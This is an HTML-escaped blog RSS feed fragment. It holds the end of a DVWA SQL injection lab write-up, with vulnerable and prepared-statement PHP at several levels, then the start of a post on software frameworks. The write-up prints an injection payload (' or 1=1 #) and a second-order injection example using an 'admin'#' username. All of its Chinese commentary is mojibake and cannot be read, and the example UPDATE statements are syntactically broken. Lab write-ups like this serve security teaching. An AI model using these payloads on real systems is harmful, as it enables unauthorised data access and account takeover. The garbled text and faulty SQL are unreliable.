    &lt;span class=&#34;nv&#34;&gt;$result&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;mysql_query&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$query&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;or&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;die&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;pre&amp;gt;&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;mysql_error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;/pre&amp;gt;&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;

    &lt;span class=&#34;c1&#34;&gt;// Get results
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;nv&#34;&gt;$num&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;mysql_numrows&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$result&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;nv&#34;&gt;$i&lt;/span&gt;   &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;while&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$num&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;c1&#34;&gt;// Display values
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;nv&#34;&gt;$first&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;mysql_result&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$result&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;first_name&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
        &lt;span class=&#34;nv&#34;&gt;$last&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;mysql_result&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$result&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;last_name&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;

        &lt;span class=&#34;c1&#34;&gt;// Feedback for end user
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;lt;pre&amp;gt;ID: &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;lt;br /&amp;gt;First name: &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$first&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;lt;br /&amp;gt;Surname: &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$last&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;lt;/pre&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;

        &lt;span class=&#34;c1&#34;&gt;// Increase loop count
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;nv&#34;&gt;$i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

    &lt;span class=&#34;c1&#34;&gt;//mysql_close();
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;high&#34;&gt;High&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-PHP&#34; data-lang=&#34;PHP&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_SESSION&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;id&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;c1&#34;&gt;// Get input
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_SESSION&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;id&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;

    &lt;span class=&#34;c1&#34;&gt;// Check database
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;c1&#34;&gt;// çœ‹èµ·æ¥åšäº†è¿”å›æ¡ç›®é™åˆ¶
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;nv&#34;&gt;$query&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;SELECT first_name, last_name FROM users WHERE user_id = &amp;#39;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#39; LIMIT 1;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;c1&#34;&gt;// æ²¡ä»€ä¹ˆå¥—è·¯
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;c1&#34;&gt;// SELECT first_name, last_name FROM users WHERE user_id = &amp;#39;1&amp;#39; or 1=1 # &amp;#39; LIMIT 1;
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
    &lt;span class=&#34;nv&#34;&gt;$result&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;mysql_query&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$query&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;or&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;die&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;pre&amp;gt;Something went wrong.&amp;lt;/pre&amp;gt;&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;

    &lt;span class=&#34;c1&#34;&gt;// Get results
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;nv&#34;&gt;$num&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;mysql_numrows&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$result&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;nv&#34;&gt;$i&lt;/span&gt;   &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;while&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$num&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;c1&#34;&gt;// Get values
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;nv&#34;&gt;$first&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;mysql_result&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$result&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;first_name&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
        &lt;span class=&#34;nv&#34;&gt;$last&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;mysql_result&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$result&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;last_name&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;

        &lt;span class=&#34;c1&#34;&gt;// Feedback for end user
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;lt;pre&amp;gt;ID: &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;lt;br /&amp;gt;First name: &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$first&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;lt;br /&amp;gt;Surname: &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$last&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;lt;/pre&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;

        &lt;span class=&#34;c1&#34;&gt;// Increase loop count
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;nv&#34;&gt;$i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

    &lt;span class=&#34;nx&#34;&gt;mysql_close&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;impossible&#34;&gt;impossible&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-PHP&#34; data-lang=&#34;PHP&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;Submit&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;c1&#34;&gt;// Check Anti-CSRF token
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;nx&#34;&gt;checkToken&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;user_token&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;],&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_SESSION&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;session_token&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;],&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;index.php&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;

    &lt;span class=&#34;c1&#34;&gt;// Get input
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;id&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;

    &lt;span class=&#34;c1&#34;&gt;// Was a number entered?
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;is_numeric&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;c1&#34;&gt;// Check the database
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;c1&#34;&gt;// è¿™æ˜¯ï¼PDO!
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;c1&#34;&gt;// PDO æ˜¯ä¸€ç§PHPä¸­æ¯”è¾ƒå…ˆè¿›çš„é¢å‘å¯¹è±¡å½¢å¼çš„æ•°æ®åº“è®¿é—®æŠ€æœ¯
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;c1&#34;&gt;// ä¸è¿‡å³ä½¿æ˜¯é¢å‘å¯¹è±¡å®ƒè¿˜æ˜¯äº‹åŠ¡è„šæœ¬å½¢å¼çš„ã€‚
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;c1&#34;&gt;// æä¾›äº†é˜²SQLæ³¨å…¥çš„åŠŸèƒ½ã€‚
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$db&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;prepare&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
        &lt;span class=&#34;c1&#34;&gt;// æ— æ³•æ³¨å…¥
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
        &lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;bindParam&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;:id&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;PDO&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;PARAM_INT&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
        &lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;execute&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
        &lt;span class=&#34;nv&#34;&gt;$row&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;fetch&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;

        &lt;span class=&#34;c1&#34;&gt;// Make sure only 1 result is returned
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;rowCount&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
            &lt;span class=&#34;c1&#34;&gt;// Get values
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;            &lt;span class=&#34;nv&#34;&gt;$first&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$row&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;first_name&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
            &lt;span class=&#34;nv&#34;&gt;$last&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$row&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;last_name&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;

            &lt;span class=&#34;c1&#34;&gt;// Feedback for end user
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;            &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;lt;pre&amp;gt;ID: &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;lt;br /&amp;gt;First name: &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$first&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;lt;br /&amp;gt;Surname: &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$last&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;lt;/pre&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;c1&#34;&gt;// Generate Anti-CSRF tsoken
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;generateSessionToken&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;extension&#34;&gt;Extension&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;äºŒæ¬¡æ³¨å…¥:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;ç½‘ç«™æœ‰ç®¡ç†å‘˜&lt;code&gt;admin&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;ä¸€ä½æ¶æ„ç”¨æˆ·æ³¨å†Œäº†&lt;code&gt;admin&#39;#&lt;/code&gt;ç”¨æˆ·.&lt;/p&gt;
&lt;p&gt;æ¶æ„ç”¨æˆ·æ›´æ–°äº†è‡ªå·±çš„å¯†ç .&lt;/p&gt;
&lt;p&gt;æ›´æ–°SQL:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;update from users
set password = &amp;lsquo;$password&amp;rsquo;
where
username = &amp;lsquo;$username&amp;rsquo; and password &amp;lsquo;$password&amp;rsquo;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;æ›¿æ¢ä¸ºæ¶æ„ç”¨æˆ·å†™å…¥çš„æ•°æ®:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;update from users
set password = #{password}
where
username = &amp;lsquo;admin&amp;rsquo;#&#39; and password = &amp;lsquo;$password&amp;rsquo;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;æ³¨æ„&lt;code&gt;#&lt;/code&gt; åé¢çš„è¯­å¥è¢«æ³¨é‡Šæ‰äº†, æ‰€ä»¥çœŸæ­£è¢«æ‰§è¡Œçš„åªæœ‰.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;update from users
set password = #{password}
where
username = &amp;lsquo;admin&amp;rsquo;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;æ¶æ„ç”¨æˆ·å¯ä»¥æ— è§†ç®¡ç†å‘˜&lt;code&gt;admin&lt;/code&gt;çš„å¯†ç éªŒè¯ï¼Œç›´æ¥ä¿®æ”¹å¯†ç ã€‚&lt;/p&gt;
</description>
        </item>
        <item>
        <title>The Framework a good design?</title>
        <link>https://sdttttt.github.io/p/the-framework-a-good-design/</link>
        <pubDate>Mon, 06 Apr 2020 23:34:30 +0800</pubDate>
        
        <guid>https://sdttttt.github.io/p/the-framework-a-good-design/</guid>
        <description>&lt;p&gt;æˆ‘ç¬¬ä¸€æ¬¡å¬åˆ°æ¡†æ¶è¿™ä¸ªæ¦‚å¿µå·²ç»æ˜¯åœ¨å¤§å­¦çš„æ—¶å€™äº†ï¼Œå½“æ—¶æˆ‘çš„è€å¸ˆå’Œæˆ‘æèµ·ã€‚
ä¸€å¼€å§‹æˆ‘éå¸¸ä¸ä¹ æƒ¯åœ¨æˆ‘ä¸ç†Ÿæ‚‰çš„ä¸Šä¸‹æ–‡ä¸­ç¼–å†™ç¨‹åºçš„æ„Ÿè§‰ã€‚åªèƒ½ç”¨å››ä¸ªå­—æ¥å½¢å®¹&lt;code&gt;å¯¸æ­¥éš¾è¡Œ&lt;/code&gt;ã€‚&lt;/p&gt;
&lt;p&gt;è¿‡äº†ä¸€æ®µæ—¶é—´åï¼Œå½“ä½ ç†Ÿæ‚‰é‡Œè¿™ä¸ªæ¡†æ¶æå‰ä¸ºä½ æ‰€åšçš„ä¸€åˆ‡çš„æ—¶å€™ï¼Œä¸€åˆ‡åªèƒ½ç”¨å››ä¸ªå­—æ¥å½¢å®¹&lt;code&gt;ç´ å·´æ‹‰ç»†&lt;/code&gt;ï¼ˆç¾å¦™ï¼‰ã€‚&lt;/p&gt;
&lt;p&gt;åæ¥ï¼Œæˆ‘æ¥è§¦äº†å„ç§å½¢å½¢è‰²è‰²çš„æ¡†æ¶ï¼Œä»PHPåˆ°Java.&lt;/p&gt;
&lt;p&gt;æœ€è®©æˆ‘æƒŠå¹çš„è«è¿‡äºSpringBoot, å®ƒå‡ ä¹ä¸ºä½ å‡†å¤‡å¥½äº†ä½ æ‰€éœ€è¦çš„ä¸€åˆ‡ï¼Œå¦‚æœä½ éœ€è¦å…¶ä»–çš„ï¼Œä¹Ÿèƒ½éå¸¸å®¹æ˜“çš„å¼•å…¥è¿›æ¥ï¼Œ
ä»»ä½•æ¡†æ¶ä»¥åŠåº“éƒ½èƒ½å’ŒSpringå®Œç¾çš„ç»“åˆåœ¨ä¸€èµ·ã€‚Springçš„å¯æ‰©å±•æ€§æ˜¯æˆ‘è§è¿‡æ‰€æœ‰æ¡†æ¶ä¸­æœ€æ£’çš„ï¼ï¼ˆå®ƒçš„æ ¸å¿ƒç†å¿µå°±æ˜¯IOCï¼‰ï¼Œä¸å¾—ä¸èµå¹Springæ˜¯åº”ç”¨å±‚çš„å®Œç¾äº§ç‰©ã€‚ï¼ˆSpringæ— æ³•è¢«å…¶ä»–è¯­è¨€æ¨¡ä»¿å’ŒJavaçš„&lt;code&gt;ä¸‡ç‰©å¯¹è±¡&lt;/code&gt;çš„ç†å¿µæœ‰å¾ˆå¤§å…³ç³»ï¼‰&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;æ›¾ç»çš„è½¯ä»¶å·¥ç¨‹å¸ˆæ²¡æœ‰è¿™æ ·çš„å¾…é‡ï¼Œä»–ä»¬å¾€å¾€æ˜¯ä»å¤´æ„å»ºèµ·ä»–ä»¬çš„åº”ç”¨ã€‚
è¿™ä½¿å¾—æˆä¸ºè½¯ä»¶å·¥ç¨‹å¸ˆè¿™ä¸€èŒä¸šéš¾ä»¥ä¼åŠã€‚&lt;/p&gt;
